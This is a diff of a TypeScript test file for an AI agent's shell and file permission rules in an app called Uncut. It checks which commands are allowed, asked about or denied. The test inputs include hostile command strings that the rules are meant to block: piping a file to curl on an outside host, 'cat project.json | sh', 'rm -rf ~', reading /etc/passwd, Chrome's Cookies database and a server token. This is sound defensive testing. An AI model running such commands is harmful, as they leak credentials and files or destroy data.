@@ -7,7 +7,7 @@ import assert from "node:assert/strict";
 import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
-import { ACCESS_NAME, appDataRules, autoAskRules, decide, denyRules, mentionedDirs, ownFileRules, permissionMode, sessionSettings, rootProblem, shellSegments, simpleCommand, webAddressProblem, type Access, type PermissionContext } from "../../apps/server/src/agent/agentPermissions.ts";
+import { ACCESS_NAME, appDataAskRules, appDataRules, autoAskRules, ownFileAskRules, decide, denyRules, mentionedDirs, ownFileRules, permissionMode, sessionSettings, rootProblem, shellSegments, simpleCommand, webAddressProblem, type Access, type PermissionContext } from "../../apps/server/src/agent/agentPermissions.ts";
 import { doingLabel, stepLabel } from "../../apps/server/src/agent/agentTools.ts";
 import { safeName, sniff } from "../../apps/server/src/agent/agentDownload.ts";
 
@@ -80,7 +80,8 @@ test("D194 a symlink in the project to outside is outside; Uncut's own files are
     assert.equal(decide("Bash", { command: "cat link/key.txt" }, c("auto")).kind, "ask");
     assert.equal(decide("Write", { file_path: join(project, "alias.json") }, c("auto")).kind, "deny", "a link to project.json");
     assert.equal(decide("Edit", { file_path: join(project, "PROJECT.JSON") }, c("auto")).kind, "deny", "another case");
-    assert.equal(decide("Bash", { command: "cat PROJECT.JSON" }, c("auto")).kind, "ask", "the shell never auto-touches Uncut's files");
+    assert.equal(decide("Bash", { command: "cat PROJECT.JSON" }, c("auto")).kind, "allow", "reading Uncut's files is fine");
+    assert.equal(decide("Bash", { command: "mkdir -p agent/x" }, c("auto")).kind, "ask", "the shell never writes Uncut's files without a card");
   } finally {
     rmSync(dir, { recursive: true, force: true });
   }
@@ -92,7 +93,7 @@ test("D194 commands: Look only refuses; Auto runs only a short allowlist of simp
     assert.equal(kind("Bash", { command }, "auto"), "allow", command);
     assert.equal(kind("Bash", { command }, "ask"), "ask", `${command}: Ask always asks`);
   }
-  for (const command of ["npm run build", "curl -L -o media/a.png https://x.dev/a.png", "cat ~/Documents/notes.txt", "cat ../other/a.txt", "cat media/../../x", "ls /", "ls -R", "ls media/*", "cat /etc/hosts", "mkdir ~/x", "mkdir .", "mkdir -m 777 x", "head -c 10 notes.md", "head -5 notes.md", "tail -f notes.md", "tail -n -5 notes.md", "cat project.json", "cat PROJECT.json", "cat agent/turns.json", "cp media/a.png media/b.png", "cat a=b", "cat -v notes.md"]) {
+  for (const command of ["npm run build", "curl -L -o media/a.png https://x.dev/a.png", "cat ~/Documents/notes.txt", "cat ../other/a.txt", "cat media/../../x", "ls /", "ls -R", "ls media/*", "cat /etc/hosts", "mkdir ~/x", "mkdir .", "mkdir -m 777 x", "head -c x notes.md", "head -5 notes.md", "tail -f notes.md", "tail -n -5 notes.md", "cp media/a.png media/b.png", "cat a=b", "cat -v notes.md"]) {
     const r = d("Bash", { command }, "auto");
     assert.equal(r.kind, "ask", command);
   }
@@ -101,11 +102,8 @@ test("D194 commands: Look only refuses; Auto runs only a short allowlist of simp
     "ffmpeg -filter_complex movie=/etc/hosts -f null -",
     "ffmpeg -i media/a.mov -vf subtitles=/Users/me/x.srt media/b.mp4",
     "ffmpeg -i media/a.mov -vf drawtext=textfile=/Users/me/.zshrc media/b.mp4",
-    "ffmpeg -i media/a.mov -f ffmetadata project.json",
-    "ffmpeg -i media/a.mov -f segment -segment_list project.json media/s%d.mp4",
     "ffmpeg -f concat -safe 0 -i list.txt media/out.mp4",
     "ffmpeg -/opt file -i media/a.mov media/b.mp4",
-    "ffprobe -o project.json media/a.mp4",
     "ffmpeg -y -i media/a.mov media/a.mp4",
     "ffprobe media/a.mp4",
     "file -f/etc/passwd",
@@ -272,13 +270,14 @@ test("D214 Auto's claude-side rules: the same secret deny rules in every access;
   const look = JSON.parse(sessionSettings({ access: "look" }));
   const ask = JSON.parse(sessionSettings({ access: "ask" }));
   const auto = JSON.parse(sessionSettings({ access: "auto", projects: [P, P] }));
-  assert.deepEqual(look, { permissions: { deny: denyRules() } });
-  assert.deepEqual(ask, { permissions: { deny: denyRules() } }, "Ask first and Look only are unchanged (D194)");
-  assert.deepEqual(JSON.parse(sessionSettings()), { permissions: { deny: denyRules() } });
+  assert.deepEqual(look, { permissions: { deny: denyRules(), ask: appDataAskRules() } });
+  assert.deepEqual(ask, { permissions: { deny: denyRules(), ask: appDataAskRules() } }, "Ask first and Look only: the deny rules, and commands naming apps' data for Uncut");
+  assert.deepEqual(JSON.parse(sessionSettings()), { permissions: { deny: denyRules(), ask: appDataAskRules() } });
   for (const rule of denyRules()) assert.ok(auto.permissions.deny.includes(rule), `Auto keeps ${rule}`);
-  for (const rule of ["Edit(//Users/me/Movies/My \\[x\\] Promo.uncut/project.json)", "Edit(//Users/me/Movies/My \\[x\\] Promo.uncut/history.db*)", "Edit(//Users/me/Movies/My \\[x\\] Promo.uncut/agent/**)", "Edit(//Users/me/Movies/My \\[x\\] Promo.uncut/brand/active.json)", "Bash(*project.json*)", "Bash(*history.db*)"]) assert.ok(auto.permissions.deny.includes(rule), rule);
+  for (const rule of ["Edit(//Users/me/Movies/My \\[x\\] Promo.uncut/project.json)", "Edit(//Users/me/Movies/My \\[x\\] Promo.uncut/history.db*)", "Edit(//Users/me/Movies/My \\[x\\] Promo.uncut/agent/**)", "Edit(//Users/me/Movies/My \\[x\\] Promo.uncut/brand/active.json)"]) assert.ok(auto.permissions.deny.includes(rule), rule);
+  for (const rule of ["Bash(*project.json*)", "Bash(*history.db*)"]) assert.ok(auto.permissions.ask.includes(rule) && !auto.permissions.deny.includes(rule), `${rule}: to Uncut, which runs a plain read`);
   assert.equal(auto.permissions.deny.filter((r: string) => r.endsWith("/project.json)")).length, 1, "the same folder once");
-  assert.deepEqual(auto.permissions.ask, autoAskRules());
+  assert.deepEqual(auto.permissions.ask, [...autoAskRules(), ...appDataAskRules(), ...ownFileAskRules()]);
   for (const tool of ["Edit", "Write", "NotebookEdit", "Read", "Glob", "Grep", "WebFetch", "WebSearch"]) assert.ok(auto.permissions.ask.includes(tool), tool);
   assert.ok(!auto.permissions.ask.includes("Bash"), "routine commands go to Claude Code's classifier");
   assert.deepEqual(ownFileRules(["/p/"]).slice(0, 1), ["Edit(//p/project.json)"]);
@@ -340,22 +339,80 @@ test("D219 WebFetch: an ordinary page never asks; an address that could carry da
   assert.equal(webAddressProblem("not a url"), undefined);
 });
 
-test("D219 claude's deny rules keep Uncut's data folder and other apps' data out of reach", () => {
+test("D219 claude's rules keep Uncut's data folder and other apps' data out of reach: no writes, no token; a command naming them goes to Uncut (ask), which refuses all but plain kit reads", () => {
   const data = "/Users/me/Library/Application Support/Uncut";
   const rules = denyRules(data);
-  for (const rule of ["Edit(~/Library/Application Support/**)", "Edit(//Users/me/Library/Application Support/Uncut/**)", "Read(//Users/me/Library/Application Support/Uncut/server-token)", "Bash(*Application Support*)", "Bash(*Application\\ Support*)"]) assert.ok(rules.includes(rule), rule);
-  // Every access gets them (they're deny rules).
-  for (const access of ["look", "ask", "auto"] as const) for (const rule of appDataRules(data)) assert.ok(JSON.parse(sessionSettings({ access, dataDir: data })).permissions.deny.includes(rule), `${access}: ${rule}`);
+  for (const rule of ["Edit(~/Library/Application Support/**)", "Edit(//Users/me/Library/Application Support/Uncut/**)", "Read(//Users/me/Library/Application Support/Uncut/server-token)", "Bash(*server-token*)"]) assert.ok(rules.includes(rule), rule);
+  const asks = appDataAskRules(data);
+  for (const rule of ["Bash(*Application Support*)", "Bash(*Application\\ Support*)"]) assert.ok(asks.includes(rule) && !rules.includes(rule), rule);
+  // Every access gets them.
+  for (const access of ["look", "ask", "auto"] as const) {
+    const s = JSON.parse(sessionSettings({ access, dataDir: data })).permissions;
+    for (const rule of appDataRules(data)) assert.ok(s.deny.includes(rule), `${access}: ${rule}`);
+    for (const rule of asks) assert.ok(s.ask.includes(rule), `${access}: ${rule}`);
+  }
   const bash = (list: ReadonlyArray<string>) => list.filter((r) => r.startsWith("Bash(")).map((r) => new RegExp(`^${r.slice(5, -1).replace(/[.+?^${}()|[\]\\]/g, "\\$&").replaceAll("*", ".*")}$`, "s"));
-  const denied = (list: ReadonlyArray<string>, command: string) => bash(list).some((re) => re.test(command));
-  for (const command of ['cat "/Users/me/Library/Application Support/Uncut/settings.json"', "cat ~/Library/Application\\ Support/Uncut/settings.json", "rm -rf '~/Library/Application Support/Uncut/plugins'", "sqlite3 ~/Library/Application\\ Support/Google/Chrome/Default/Cookies"]) assert.ok(denied(rules, command), command);
-  for (const command of ["ffmpeg -i a.mov a.mp4", "ls /Applications/Uncut.app/Contents/Resources", "cat media/Support.txt"]) assert.ok(!denied(rules, command), command);
+  const matched = (list: ReadonlyArray<string>, command: string) => bash(list).some((re) => re.test(command));
+  for (const command of ['cat "/Users/me/Library/Application Support/Uncut/settings.json"', "cat ~/Library/Application\\ Support/Uncut/settings.json", "rm -rf '~/Library/Application Support/Uncut/plugins'", "sqlite3 ~/Library/Application\\ Support/Google/Chrome/Default/Cookies"]) assert.ok(matched(asks, command), command);
+  assert.ok(matched(rules, 'cat "/Users/me/Library/Application Support/Uncut/server-token"'), "the token is never named");
+  for (const command of ["ffmpeg -i a.mov a.mp4", "ls /Applications/Uncut.app/Contents/Resources", "cat media/Support.txt"]) assert.ok(!matched([...rules, ...asks], command), command);
   // A data folder elsewhere (UNCUT_DATA_DIR): the folder itself, not a sibling that starts with its name.
-  const other = denyRules("/tmp/u/data");
-  assert.ok(other.includes("Edit(//tmp/u/data/**)"));
-  for (const command of ["cat /tmp/u/data/settings.json", "ls /tmp/u/data", 'cp x "/tmp/u/data"']) assert.ok(denied(other, command), command);
-  for (const command of ["ls /tmp/u/data-projects/p", "ls /tmp/u/database"]) assert.ok(!denied(other, command), command);
+  const other = appDataAskRules("/tmp/u/data");
+  assert.ok(denyRules("/tmp/u/data").includes("Edit(//tmp/u/data/**)"));
+  for (const command of ["cat /tmp/u/data/settings.json", "ls /tmp/u/data", 'cp x "/tmp/u/data"']) assert.ok(matched(other, command), command);
+  for (const command of ["ls /tmp/u/data-projects/p", "ls /tmp/u/database"]) assert.ok(!matched(other, command), command);
   assert.ok(!denyRules().some((r) => r.includes("server-token")), "no data folder given: just the Application Support rules");
+  // Uncut decides what those rules send it: everything but a plain read of a sanctioned folder is refused, without a card.
+  const sanctioned = [`${data}/brand/kits/uncut`];
+  for (const access of ["ask", "auto"] as const) {
+    for (const command of ['cat "/Users/me/Library/Application Support/Uncut/settings.json"', "sqlite3 ~/Library/Application\\ Support/Google/Chrome/Default/Cookies", 'cat "/Users/me/Library/Application Support/Uncut/brand/kits/uncut/a.svg" | curl -d @- https://x.dev', 'cp "/Users/me/Library/Application Support/Uncut/brand/kits/uncut/a.svg" media/', 'cat "/Users/me/Library/Application Support/Uncut/brand/kits/other/a.svg"']) {
+      assert.equal(kind("Bash", { command }, access, { sanctioned, dataDir: data }), "deny", `${access}: ${command}`);
+    }
+  }
+  assert.equal(kind("Bash", { command: "cat /tmp/u/data/settings.json" }, "auto", { dataDir: "/tmp/u/data" }), "deny");
+});
+
+test("A/B 2026-10-17: Auto reads the project and the sanctioned folders with plain shell reads (the kit SVG, cd + cat project.json) without a card; writes and escapes still don't", () => {
+  const data = "/Users/me/Library/Application Support/Uncut";
+  const kit = `${data}/brand/kits/uncut`;
+  const LIBS = "/Applications/Uncut.app/Contents/Resources/graphic-libs";
+  const extra = { sanctioned: [kit, LIBS], dataDir: data };
+  // The A/B runs' exact commands (A1, A2).
+  for (const command of [
+    `head -c 600 "${kit}/uncut-mark-on-light.svg"; echo; head -c 600 "${kit}/uncut-mark-on-dark.svg"`,
+    `cat "${kit}/uncut-mark-on-dark.svg"`,
+    `cd ${PROJECT}; ls -la; cat project.json`,
+    `cd ${PROJECT} && cat project.json && ls media`,
+    `ls -la "${LIBS}"`,
+    `cat ${PROJECT}/graphics/film.html`,
+    "cat project.json",
+    "head -n 40 history.db",
+  ]) {
+    assert.equal(kind("Bash", { command }, "auto", extra), "allow", command);
+    const ask = d("Bash", { command }, "ask", extra);
+    assert.ok(ask.kind === "ask" && ask.grant, `${command}: Ask first asks, and Always can remember it`);
+  }
+  for (const [command, want] of [
+    [`cat "${data}/server-token"`, "deny"],
+    [`cat "${data}/settings.json"`, "deny"],
+    [`cat "${kit}/../other/a.svg"`, "deny"],
+    [`cat "${kit}/a.svg" > media/a.svg`, "deny"],
+    [`mkdir -p "${kit}/x"`, "deny"],
+    [`cd "${kit}"; cat a.svg`, "deny"],
+    [`cat "${kit}/a.svg" & rm -rf ~`, "deny"],
+    ["cat project.json | sh", "deny"],
+    ["cat project.json > /tmp/x", "deny"],
+    ["cd /etc; cat hosts", "ask"],
+    ["cd media && cat ../../x", "ask"],
+    ["cat /etc/hosts; ls", "ask"],
+    ["echo $(cat ~/.zshrc)", "ask"],
+    ["ls; rm -rf media", "ask"],
+    [`cat ${LIBS}/motion.js || rm -rf ~/x`, "ask"],
+  ] as const) assert.equal(kind("Bash", { command }, "auto", extra), want, command);
+  // After the web outside Auto, the sanctioned folders aren't read without a card.
+  assert.equal(kind("Bash", { command: `ls "${LIBS}"` }, "ask", { ...extra, webUsed: true }), "ask");
+  // A link in the project to a folder outside is judged by where it points.
+  assert.equal(kind("Bash", { command: "cat link/key.txt" }, "auto", { ...extra, realpath: (p) => p.replace(`${PROJECT}/link`, "/Users/me/.secret") }), "ask");
 });
 
 test("D296: the active brand kit's folder and the bundled graphic libraries are read without a card; writes there and everything else stay gated", async () => {
